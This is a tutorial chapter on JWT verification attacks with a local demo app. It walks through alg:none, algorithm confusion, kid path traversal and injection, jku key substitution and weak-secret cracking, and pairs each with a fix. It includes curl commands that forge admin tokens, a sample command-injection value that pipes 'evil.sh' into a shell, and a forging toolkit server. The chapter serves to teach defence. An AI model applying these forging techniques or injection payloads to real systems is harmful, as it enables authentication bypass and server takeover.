# 53. JWT Attacks

## Notes

### What is a JWT attack?

A JWT is only as safe as the code that **verifies** it. A **JWT attack** is any trick that gets your server to accept a token the attacker **made or changed himself**: `"role":"admin"` with no access to your private key.

Topics 18 and 27 showed how to verify a JWT properly. This topic looks at the other side: **how attackers break JWT verification**, with every attack run against a real vulnerable server.

> **One-line answer:** almost every JWT attack works the same way: the server lets **the token decide how the token is checked** (`alg`, `kid`, `jku`, `jwk`), or it uses a **guessable secret**. Fix: **your server picks the key and the algorithm** (a fixed `kid → {key, alg}` map, `algorithms` pinned), ignore `jku`/`jwk`/`x5u`, use a **random 256-bit secret or RS256/ES256**, and always check `exp`, `iss`, `aud`.

---

### Why it matters

| Attack | What the attacker does | Result |
|---|---|---|
| **`alg: none`** | Changes the header to `"alg":"none"` and deletes the signature | Any claims he wants, no key needed |
| **Algorithm confusion** (RS256 → HS256) | Signs with HMAC using your **public** key as the secret | Valid-looking token from a key everyone can download |
| **`kid` injection** | Sets `kid` to a file path (`../package.json`), SQL, or a command | Server uses a "key" the attacker knows |
| **`jku` / `jwk` injection** | Points the server at **his own** public key | Signs with his private key, server says "valid" |
| **Weak secret** | Cracks the HS256 secret **offline** from one real token | Signs anything, forever, until you change the secret |
| **Missing claim checks** | Replays an **expired** token, or one made for another app | Old or wrong tokens still work (topic 27) |

The header is **attacker-controlled input**, just like a form field. Real libraries shipped these bugs: `alg: none` was accepted by several JWT libraries in 2015, algorithm confusion hit `jsonwebtoken` before v4.2.2, and embedded `jwk` keys were trusted by Cisco's `node-jose` in 2018 (CVE-2018-0114).

---

### Real-life example: the office gate pass 🪪

Priya runs the security desk at a Bengaluru office. Visitors show a **gate pass** with a stamp.

1. Vikram shows a pass that says "**No stamp needed for this pass**" → `alg: none`. A good guard ignores what the pass says about itself.
2. He stamps it with the **sample stamp printed on the office brochure** → algorithm confusion (the public key used as a secret).
3. The pass says "**check the stamp in drawer `../reception-brochure`**" → `kid` path traversal.
4. The pass says "**call this number to confirm the stamp is real**" (it's Vikram's friend) → `jku` injection.
5. The real stamp just says "**1234**", and he guessed it at home → weak HS256 secret.
6. Fix: Priya keeps **her own list** of real stamps and checks each pass against it. She never asks the pass how to check the pass.

---

### How the attacks fit together

#### 📊 Diagrams

Open **[diagrams.html](diagrams.html)** in your browser (just double-click the file) to see:

- **Flow diagram**: every decision a verifier makes, and which attack wins at each bad answer
- **Data flow**: Vikram forging an admin token with algorithm confusion, against both verifiers (real values from the demo)
- **Weak secret**: why cracking an HS256 secret needs no server at all

In short: `attacker edits header (alg / kid / jku) + payload (role: admin) → signs with something he has (nothing, your public key, a public file, his own key, a cracked secret) → vulnerable server lets the header choose → accepts. Safe server: kid → OUR key + OUR alg → rejects`

A JWT header looks like this. **Every field in it was written by whoever made the token:**

```json
{ "alg": "RS256", "typ": "JWT", "kid": "rs-1" }
```

---

### Attack 1: `alg: none`

The JWT standard defines an "unsecured" token: `"alg":"none"` and an **empty signature** (the token ends with a dot).

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoicnMtMSJ9.eyJlbWFpbCI6InZpa3JhbUBtYWlsLmNvbSIsInJvbGUiOiJhZG1pbiIs…fQ.
{"alg":"none","typ":"JWT","kid":"rs-1"}  +  {"email":"vikram@mail.com","role":"admin",…}  +  (nothing)
```

The vulnerable code:

```js
if (header.alg === "none") return payload;   // ❌ "the token says it doesn't need checking"
```

Variations attackers try: `"None"`, `"NONE"`, `"nOnE"` (for code that compares case-sensitively against a block-list).

**Fix:** pin the algorithms. `jwt.verify(token, key, { algorithms: ["RS256"] })` rejects it with `jwt signature is required`.

---

### Attack 2: Algorithm confusion (RS256 → HS256)

The cleverest one. Remember topic 18:

- **RS256** signs with a **private** key and verifies with a **public** key.
- **HS256** signs **and** verifies with **one shared secret**.

Your server verifies RS256 with the public key, which you **publish** at `/.well-known/jwks.json`. The attacker:

1. Downloads your public key (it's public!)
2. Makes a token with `"alg":"HS256"`
3. Signs it with **HMAC, using your public key as the secret**

```js
// Vulnerable: the HEADER decides what to do with the key
if (header.alg === "HS256") ok = hmac(PUBLIC_KEY, data) === signature;          // ❌ same bytes the attacker used
else if (header.alg === "RS256") ok = crypto.verify("sha256", data, PUBLIC_KEY, signature);
```

The server runs HMAC with its public key, gets the same result the attacker got, and says "valid".

**Fix:** a key is tied to **one** algorithm, chosen by you:

```js
const KEYS = { "rs-1": { alg: "RS256", key: PUBLIC_KEY } };
jwt.verify(token, KEYS[kid].key, { algorithms: [KEYS[kid].alg] });  // ✅ "invalid algorithm"
```

Modern `jsonwebtoken` (v9) also refuses to use an RSA public key as an HMAC secret. Don't rely on that alone: pin `algorithms` anyway.

---

### Attack 3: `kid` injection

`kid` (key ID) says **which** key signed the token. It's useful for key rotation (topic 54). But it's a **string from the attacker**, and some code uses it to **find** the key:

| Vulnerable code | Attacker's `kid` | What happens |
|---|---|---|
| `fs.readFileSync("keys/" + kid)` | `../package.json` (public on GitHub) | The "secret" is a file he can read. He signs HS256 with it. |
| `fs.readFileSync("keys/" + kid)` | `../../../../dev/null` | The secret is **empty**. He signs with `""`. |
| `` db.query(`SELECT key FROM keys WHERE kid = '${kid}'`) `` | `x' UNION SELECT 'abc` | SQL injection: the key is `abc` |
| `` exec(`openssl … ${kid}`) `` | `x; curl evil.sh \| sh` | Command injection: he owns the server |

**Fix:** `kid` is only ever a **lookup key in your own fixed map**:

```js
if (typeof kid !== "string" || !Object.hasOwn(KEYS, kid)) throw new Error("unknown kid");
```

(`Object.hasOwn`, not `KEYS[kid]`, so `kid: "constructor"` or `"__proto__"` can't find something weird.)

---

### Attack 4: `jku` / `jwk` / `x5u` injection

These headers say **where the public key is**:

| Header | Means |
|---|---|
| `jku` | "My public keys are at **this URL**" |
| `jwk` | "Here's my public key, **inside** this header" |
| `x5u` / `x5c` | Same idea, with X.509 certificates |

If your server trusts them, the attacker makes his **own** key pair, signs with his private key, and points `jku` at his server:

```json
{ "alg": "RS256", "typ": "JWT", "kid": "evil-1", "jku": "http://127.0.0.1:3154/jwks.json" }
```

The server downloads **his** key, verifies **his** signature, and it matches. Bonus: the server now makes HTTP requests to any URL the attacker chooses, which is **SSRF** (it can reach internal services like `169.254.169.254`).

**Fix:** keys come from **your configuration only**: a fixed map, or the JWKS URL of **your configured issuer** (Level 5). Ignore `jku`, `jwk`, `x5u` and `x5c` in incoming tokens.

---

### Attack 5: Weak HS256 secret

Here the verify code is **perfect**:

```js
jwt.verify(token, "chaicart123", { algorithms: ["HS256"], issuer: ISSUER, audience: AUDIENCE }); // looks fine!
```

But one real token is all an attacker needs. He tries guesses **on his own laptop**:

```js
const secret = WORDLIST.find((w) => hmac(w, header + "." + payload) === signature);
```

No requests to your server, so **no rate limit, no lockout, no logs**. Tools like `hashcat` (mode 16500) try **billions of guesses per second** on a GPU. `secret`, `your-256-bit-secret` (from jwt.io's example), `chaicart123`, or anything a human can remember falls in seconds.

**Fix:**

```js
crypto.randomBytes(32).toString("base64url")   // ✅ 256 random bits: can't be guessed
```

Or use **RS256 / ES256**: there's no shared secret to crack, and only the auth server holds the private key. Keep secrets out of code and Git (topic 54).

---

### Attack 6: Missing claim checks

A valid signature only means "**we made this, once**". Without claim checks:

- An **expired** token still works (no `exp` check). A stolen token works forever.
- A token for **another app** on the same key works (no `aud` check).
- A **refresh** or **ID** token is accepted as an access token (no `typ` check).

Topic 27 covers these. `jwt.verify` checks `exp` by default, but only checks `iss` and `aud` **if you pass them**.

---

### ✅ The safe verifier, step by step

```js
function verifySafe(token) {
  if (token.length > 4096) throw new Error("token too long");                       // 0. don't parse giant input
  const kid = jwt.decode(token, { complete: true })?.header?.kid;
  if (typeof kid !== "string" || !Object.hasOwn(KEYS, kid)) throw new Error("unknown kid"); // 1. kid → OUR key
  const { alg, key } = KEYS[kid];
  return jwt.verify(token, key, {
    algorithms: [alg],                                                                // 2. OUR algorithm
    issuer: ISSUER, audience: AUDIENCE, clockTolerance: 30,                           // 3. claims (topic 27)
  });
}
```

`jwt.decode` is used **only** to read the `kid`, never to trust anything. `jku`, `jwk` and `x5u` are simply never read.

| ✅ Do | ❌ Don't |
|---|---|
| Use a well-known, **up-to-date** library (`jsonwebtoken` v9, `jose`) | Write your own JWT verification |
| `algorithms: [...]` pinned, **one algorithm per key** | Let `header.alg` choose |
| `kid` → your own fixed map, with `Object.hasOwn` | Use `kid` in a file path, SQL or shell command |
| Keys from **your config** / your issuer's JWKS | Trust `jku`, `jwk`, `x5u` from the token |
| `crypto.randomBytes(32)` secrets, or RS256/ES256 | `"secret"`, `"your-256-bit-secret"`, your app name |
| Check `exp`, `iss`, `aud`, `typ` | `jwt.decode()` and trust the result |
| Generic `401` to the client, real reason in the log | Tell the attacker which check failed |

---

### 🤔 Tricky parts

**1. `decode` vs `verify`.** `jwt.decode()` **only reads** the token. Using its result for anything except "which key should I use?" is the same as having no signature. This is the most common real-world JWT bug: a middleware that decodes, or a second service that "trusts the gateway already checked it".

**2. Block-lists don't work.** `if (alg === "none") reject` misses `"None"`, `"nOnE"`, and HS256 confusion. **Allow-list** the one algorithm you expect.

**3. Public keys are public on purpose.** Algorithm confusion isn't "the attacker stole a key". He used a key you **published**. That's why the algorithm must come from you.

**4. Signature comparison timing.** Compare HMACs with `crypto.timingSafeEqual`, not `===` (topic 51). Libraries already do this; hand-written code often doesn't.

**5. ECDSA "psychic signatures" (CVE-2022-21449).** Java 15–18 accepted an ES256 signature of all zeros as valid for **any** token and any key. Lesson: keep your runtime and JWT library patched.

**6. A JWT in a URL leaks.** `?token=eyJ…` ends up in server logs, browser history and the `Referer` header. Send it in the `Authorization` header (topic 19).

**7. Cracked secret = rotate.** If an HS256 secret was weak or leaked, every token ever signed with it is suspect. Change the secret (all users log in again) and see topic 54 for rotation without downtime.

---

### Common beginner mistakes

1. **Leaving out `algorithms` in `jwt.verify`.**
   Pin it, every time, even if your library version is "safe by default".

2. **Using `jwt.decode()` for auth decisions.**
   Decode only to find the `kid`. Verify before trusting anything.

3. **A short, human secret like `"secret"` or the app's name.**
   Use 32 random bytes, or RS256/ES256.

4. **Copying `your-256-bit-secret` from jwt.io into production.**
   It's in every attacker's wordlist.

5. **Using `kid` in a file path, SQL query or shell command.**
   Map it through your own fixed list.

6. **Fetching keys from `jku` / using `jwk` from the token.**
   Keys come from your configuration only.

7. **One key for both RS256 and HS256.**
   One key, one algorithm.

8. **Not checking `exp`, `iss`, `aud`.**
   A correctly signed token can still be expired or meant for someone else.

9. **Writing your own JWT library "because it's just base64 and HMAC".**
   Our vulnerable verifier is about 30 lines and has 6 serious bugs.

10. **Returning the exact failure reason** (`"invalid algorithm"`) to the client in production.
    It tells the attacker which trick almost worked.

---

### Interview questions

1. **What is the `alg: none` attack and how do you prevent it?**
   The attacker sets `"alg":"none"` and removes the signature. A library that trusts the header accepts it as valid. Prevent it by pinning the allowed algorithms in `verify`.

2. **Explain algorithm confusion.**
   The server verifies RS256 tokens with a public key. The attacker makes an HS256 token and HMAC-signs it using that public key as the secret. If the server lets the header pick the algorithm, it computes the same HMAC with its public key and accepts it. Fix: one algorithm per key, chosen by the server.

3. **What can go wrong with the `kid` header?**
   It's attacker input. Used in a file path it allows path traversal (to `/dev/null` or a public file), in SQL it allows injection, in a shell it allows command injection. Treat it as a lookup key into a fixed map only.

4. **What are `jku` and `jwk`, and why are they dangerous?**
   They tell the verifier where the public key is (a URL, or embedded in the header). Trusting them lets the attacker supply his own key. `jku` is also an SSRF vector. Get keys only from your configured issuer.

5. **How is an HS256 secret cracked, and how do you stop it?**
   Offline: take one valid token and try candidate secrets until the HMAC matches (hashcat). No server contact, so no rate limiting helps. Use at least 256 random bits, or switch to an asymmetric algorithm.

6. **HS256 or RS256: which would you choose?**
   RS256/ES256 when several services verify tokens: only the auth server holds the private key, others get the public key. HS256 is fine for a single service with a strong secret, but every verifier holds a key that can also **sign**.

7. **Why shouldn't you write your own JWT verification?**
   The format looks simple but has many traps: header-driven algorithm choice, `none`, key confusion, timing-unsafe comparison, claim checks. Mature libraries have already been attacked and fixed.

8. **A token signed with your key has `"role":"admin"` but the user isn't an admin. What happened?**
   Either the key leaked or was cracked (weak secret), or the verifier was bypassed (`none`, confusion, `kid`/`jku`). Check logs, rotate the key (topic 54), revoke sessions, and fix the verifier.

---

### Quick recap

- The JWT **header is attacker input**: `alg`, `kid`, `jku`, `jwk` must never decide how verification works
- **`alg: none`** and **algorithm confusion** → pin `algorithms`, one algorithm per key
- **`kid`** → lookup in your own map (`Object.hasOwn`), never a path, query or command
- **`jku` / `jwk` / `x5u`** → ignore; keys come from your config or your issuer's JWKS
- **Weak HS256 secrets** crack offline → `randomBytes(32)` or RS256/ES256
- Always check **`exp`, `iss`, `aud`, `typ`** (topic 27), use a patched library, and never `decode()` for auth
- Next: keeping secrets out of code and rotating keys (topic 54)

## Code

A small **Express** app with **two servers in one file**:

- **ChaiCart API** (on `PORT`): `/login` gives an RS256 token (`kid: "rs-1"`), and the admin panel is behind **two verifiers**:
  - `/vulnerable/admin`: a hand-written verifier with every bug from the notes (trusts `alg`, `kid`, `jku`, never checks `exp`/`iss`/`aud`)
  - `/admin`: the safe verifier (`jsonwebtoken`, `kid` → fixed map, pinned algorithm, claim checks)
  - `/legacy/login` + `/legacy/admin`: an old API whose verify code is correct but whose HS256 secret is `chaicart123`
- **Vikram's server** (on `PORT + 1`): a fake JWKS at `/jwks.json` and a forging toolkit at `POST /forge/:attack` (`none`, `confusion`, `kid`, `jku`, `crack`). It uses only public things: Vikram's own token, the public JWKS, a public file and a wordlist.

At every start a **self-check** runs each attack against both verifiers and stops the server if any result is wrong. Everything is in memory, and the keys are new on every start.

📄 **Full code: [server.js](server.js)**. Open it and read the comments: the ❌ lines are the bugs, the ✅ lines are the fixes.

Install the dependencies once (from this folder), then start the server:

```bash
npm install
```

```bash
node server.js
```

> Port 3000 busy? Run it on another port: `PORT=3153 node server.js` (Git Bash). Vikram's server then runs on 3154. The outputs below were recorded on port 3153.

You should see:

```
🛒 ChaiCart API on http://localhost:3153
😈 Attacker server on http://127.0.0.1:3154 (fake JWKS: /jwks.json, toolkit: POST /forge/:attack)
✅ Self-check passed: none, alg confusion, kid traversal, jku, expired and weak-secret attacks behave as expected
```

### Try it (Git Bash)

```bash
APP=http://localhost:3153
EVIL=http://127.0.0.1:3154
tok() { node -pe 'JSON.parse(require("fs").readFileSync(0)).token'; }
```

`tok` pulls `token` out of a JSON response. The test accounts are **vikram@mail.com** / **vikram-pass-99** (user) and **priya@mail.com** / **priya-admin-77** (admin).

🔑 **① Vikram logs in** with his normal account:

```bash
TOKEN=$(curl -s $APP/login -H "Content-Type: application/json" -d '{"email":"vikram@mail.com","password":"vikram-pass-99"}' | tok)
echo $TOKEN | cut -d. -f1,2 | tr . '\n' | node -e 'require("fs").readFileSync(0,"utf8").trim().split("\n").forEach(p => console.log(Buffer.from(p,"base64url").toString()))'
```
→
```
{"alg":"RS256","typ":"JWT","kid":"rs-1"}
{"email":"vikram@mail.com","role":"user","iat":1793930124,"exp":1793931024,"aud":"chaicart-api","iss":"chaicart-auth","sub":"u_1"}
```

🚫 **② He's not an admin** (on both verifiers, his real token is checked fine):

```bash
curl -s $APP/admin -H "Authorization: Bearer $TOKEN"
```
→ `{"error":"Admins only","you":"vikram@mail.com"}`

😈 **③ Attack 1: `alg: none`.** Copy his claims, set `role: admin`, drop the signature:

```bash
FORGED=$(curl -s $EVIL/forge/none -H "Content-Type: application/json" -d "{\"token\":\"$TOKEN\",\"claims\":{\"role\":\"admin\"}}" | tok)
echo $FORGED
curl -s $APP/vulnerable/admin -H "Authorization: Bearer $FORGED"
curl -s $APP/admin -H "Authorization: Bearer $FORGED"
```
→
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoicnMtMSJ9.eyJlbWFpbCI6InZpa3JhbUBtYWlsLmNvbSIsInJvbGUiOiJhZG1pbiIs…In0.
{"message":"Welcome to the admin panel, vikram@mail.com","allUsers":["vikram@mail.com (user)","priya@mail.com (admin)"]}   ❌ vulnerable
{"error":"Invalid token","debugReason":"jwt signature is required"}                                                         ✅ safe
```

Every attack below follows the same pattern: forge, then send the forged token to both. Change `none` in the URL to try the others:

```bash
for ATTACK in confusion kid jku; do
  FORGED=$(curl -s $EVIL/forge/$ATTACK -H "Content-Type: application/json" -d "{\"token\":\"$TOKEN\",\"claims\":{\"role\":\"admin\"}}" | tok)
  echo "== $ATTACK: $(echo $FORGED | cut -d. -f1 | node -pe 'Buffer.from(require("fs").readFileSync(0,"utf8").trim(),"base64url").toString()')"
  curl -s $APP/vulnerable/admin -H "Authorization: Bearer $FORGED"; echo
  curl -s $APP/admin -H "Authorization: Bearer $FORGED"; echo
done
```
→
```
== confusion: {"alg":"HS256","typ":"JWT","kid":"rs-1"}
{"message":"Welcome to the admin panel, vikram@mail.com","allUsers":["vikram@mail.com (user)","priya@mail.com (admin)"]}
{"error":"Invalid token","debugReason":"invalid algorithm"}
== kid: {"alg":"HS256","typ":"JWT","kid":"../package.json"}
{"message":"Welcome to the admin panel, vikram@mail.com","allUsers":["vikram@mail.com (user)","priya@mail.com (admin)"]}
{"error":"Invalid token","debugReason":"unknown kid \"../package.json\""}
== jku: {"alg":"RS256","typ":"JWT","kid":"evil-1","jku":"http://127.0.0.1:3154/jwks.json"}
{"message":"Welcome to the admin panel, vikram@mail.com","allUsers":["vikram@mail.com (user)","priya@mail.com (admin)"]}
{"error":"Invalid token","debugReason":"unknown kid \"evil-1\""}
```

- **confusion**: Vikram downloaded `$APP/.well-known/jwks.json` and used the public key as an HMAC secret.
- **kid**: the vulnerable server read `old-keys/../package.json` = this folder's `package.json`, which Vikram can read on GitHub.
- **jku**: the vulnerable server fetched `$EVIL/jwks.json` and verified with **Vikram's** key.

🔓 **④ Attack 5: weak secret.** The legacy API verifies correctly, but its secret is guessable:

```bash
LEGACY=$(curl -s $APP/legacy/login -H "Content-Type: application/json" -d '{"email":"vikram@mail.com","password":"vikram-pass-99"}' | tok)
CRACKED=$(curl -s $EVIL/forge/crack -H "Content-Type: application/json" -d "{\"token\":\"$LEGACY\",\"claims\":{\"role\":\"admin\"}}")
echo $CRACKED
curl -s $APP/legacy/admin -H "Authorization: Bearer $(echo $CRACKED | tok)"
```
→
```
{"secret":"chaicart123","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InZpa3JhbUBtYWlsLmNvbSIsInJvbGUiOiJhZG1pbiIs…"}
{"message":"Welcome to the admin panel, vikram@mail.com","allUsers":["vikram@mail.com (user)","priya@mail.com (admin)"]}   ❌
```

The same cracker against the RS256 token (no shared secret to guess):

```bash
curl -s $EVIL/forge/crack -H "Content-Type: application/json" -d "{\"token\":\"$TOKEN\"}"
```
→ `{"error":"Not cracked: none of the 20 words matched"}`

The self-check also cracks a token signed with `crypto.randomBytes(32)` at every start, and it must fail.

📋 **⑤ The server log** shows why each forged token was refused:

```
❌ /admin rejected a token: jwt signature is required
❌ /admin rejected a token: invalid algorithm
❌ /admin rejected a token: unknown kid "../package.json"
❌ /admin rejected a token: unknown kid "evil-1"
```

> **Windows PowerShell users:** the quoting in `-d "{\"token\":…}"`, `$(…)` and the `tok` function work in Git Bash. In PowerShell, use Git Bash or Postman, or set the port with `$env:PORT=3153; node server.js`. Restart the server to get new keys.
